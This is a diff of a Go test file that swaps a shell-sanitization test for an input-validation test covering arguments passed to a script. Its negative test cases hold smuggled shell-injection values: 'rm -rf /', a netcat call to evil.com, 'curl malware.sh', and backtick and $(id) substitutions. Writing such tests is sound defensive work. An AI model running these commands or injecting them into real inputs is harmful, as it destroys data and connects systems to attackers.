@@ -254,21 +254,7 @@ echo "Script completed"
 	}
 }
 
-func TestExecuteScriptInputSanitization(t *testing.T) {
-	// Create a test script that echoes all its arguments
-	testScript := `#!/bin/sh
-echo "Args received:"
-for arg in "$@"; do
-    echo "  '$arg'"
-done
-`
-	
-	scriptPath := "./sanitization_test.sh"
-	if err := os.WriteFile(scriptPath, []byte(testScript), 0755); err != nil {
-		t.Fatalf("Failed to create test script: %v", err)
-	}
-	defer os.Remove(scriptPath)
-
+func TestExecuteScriptInputValidation(t *testing.T) {
 	tests := []struct {
 		name       string
 		clientIP   string
@@ -276,67 +262,136 @@ done
 		domain     string
 		ttl        string
 		action     string
+		expectValid bool
 	}{
 		{
-			name:       "Normal inputs",
+			name:       "Valid inputs",
 			clientIP:   "192.168.1.100",
 			resolvedIP: "1.2.3.4",
 			domain:     "example.com",
 			ttl:        "300",
-			action:     "ALLOW",
+			action:     "add",
+			expectValid: true,
 		},
 		{
-			name:       "Inputs with dangerous characters",
+			name:       "Valid IPv6",
+			clientIP:   "2001:db8::1",
+			resolvedIP: "2001:db8::2",
+			domain:     "test.example.com",
+			ttl:        "600",
+			action:     "allow",
+			expectValid: true,
+		},
+		{
+			name:       "Shell injection in IP",
 			clientIP:   "192.168.1.100; rm -rf /",
-			resolvedIP: "1.2.3.4|nc evil.com 1234",
-			domain:     "example.com && curl malware.sh",
-			ttl:        "300`whoami`",
-			action:     "ALLOW$(id)",
+			resolvedIP: "1.2.3.4",
+			domain:     "example.com",
+			ttl:        "300",
+			action:     "add",
+			expectValid: false,
 		},
 		{
-			name:       "Inputs with quotes",
-			clientIP:   "192.168.1.'100'",
-			resolvedIP: "1.2.3.\"4\"",
-			domain:     "exam'ple.com",
-			ttl:        "30\"0",
-			action:     "AL'LOW",
+			name:       "Command injection in resolved IP",
+			clientIP:   "192.168.1.100",
+			resolvedIP: "1.2.3.4|nc evil.com 1234",
+			domain:     "example.com",
+			ttl:        "300",
+			action:     "add",
+			expectValid: false,
+		},
+		{
+			name:       "Script injection in domain",
+			clientIP:   "192.168.1.100",
+			resolvedIP: "1.2.3.4",
+			domain:     "example.com && curl malware.sh",
+			ttl:        "300",
+			action:     "add",
+			expectValid: false,
+		},
+		{
+			name:       "Command substitution in TTL",
+			clientIP:   "192.168.1.100",
+			resolvedIP: "1.2.3.4",
+			domain:     "example.com",
+			ttl:        "300`whoami`",
+			action:     "add",
+			expectValid: false,
+		},
+		{
+			name:       "Variable expansion in action",
+			clientIP:   "192.168.1.100",
+			resolvedIP: "1.2.3.4",
+			domain:     "example.com",
+			ttl:        "300",
+			action:     "add$(id)",
+			expectValid: false,
+		},
+		{
+			name:       "Invalid action",
+			clientIP:   "192.168.1.100",
+			resolvedIP: "1.2.3.4",
+			domain:     "example.com",
+			ttl:        "300",
+			action:     "malicious_action",
+			expectValid: false,
+		},
+		{
+			name:       "Invalid IP format",
+			clientIP:   "999.999.999.999",
+			resolvedIP: "1.2.3.4",
+			domain:     "example.com",
+			ttl:        "300",
+			action:     "add",
+			expectValid: false,
+		},
+		{
+			name:       "Invalid domain format",
+			clientIP:   "192.168.1.100",
+			resolvedIP: "1.2.3.4",
+			domain:     "-invalid.com",
+			ttl:        "300",
+			action:     "add",
+			expectValid: false,
+		},
+		{
+			name:       "Invalid TTL",
+			clientIP:   "192.168.1.100",
+			resolvedIP: "1.2.3.4",
+			domain:     "example.com",
+			ttl:        "0",
+			action:     "add",
+			expectValid: false,
 		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			// Sanitize inputs as done in executeScript
-			safeClientIP := sanitizeForShell(tt.clientIP)
-			safeResolvedIP := sanitizeForShell(tt.resolvedIP)
-			safeDomain := sanitizeForShell(tt.domain)
-			safeTTL := sanitizeForShell(tt.ttl)
-			safeAction := sanitizeForShell(tt.action)
-
-			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-			defer cancel()
-
-			cmd := exec.CommandContext(ctx, scriptPath, safeClientIP, safeResolvedIP, safeDomain, safeTTL, safeAction)
-			cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
-
-			output, err := cmd.Output()
-			if err != nil {
-				t.Errorf("Script execution failed: %v", err)
-				return
+			// Test input validation as done in executeScript
+			var validationErrors []error
+			
+			if err := validateForShellExecution(tt.clientIP, "ip"); err != nil {
+				validationErrors = append(validationErrors, err)
+			}
+			if err := validateForShellExecution(tt.resolvedIP, "ip"); err != nil {
+				validationErrors = append(validationErrors, err)
+			}
+			if err := validateForShellExecution(tt.domain, "domain"); err != nil {
+				validationErrors = append(validationErrors, err)
+			}
+			if err := validateForShellExecution(tt.ttl, "ttl"); err != nil {
+				validationErrors = append(validationErrors, err)
+			}
+			if err := validateForShellExecution(tt.action, "action"); err != nil {
+				validationErrors = append(validationErrors, err)
 			}
 
-			outputStr := string(output)
+			hasValidationErrors := len(validationErrors) > 0
 
-			// Verify that dangerous characters are not present in the output
-			dangerousChars := []string{";", "|", "&", "$", "`", "(", ")", "'", "\""}
-			for _, char := range dangerousChars {
-				if strings.Count(outputStr, char) > strings.Count(testScript, char) {
-					t.Errorf("Dangerous character %q found in script output, sanitization may have failed", char)
-				}
-			}
-
-			// Verify basic output structure
-			if !strings.Contains(outputStr, "Args received:") {
-				t.Error("Script output should contain 'Args received:'")
+			if tt.expectValid && hasValidationErrors {
+				t.Errorf("Expected valid inputs but got validation errors: %v", validationErrors)
+			} else if !tt.expectValid && !hasValidationErrors {
+				t.Errorf("Expected validation errors for malicious inputs but validation passed")
 			}
 		})
 	}
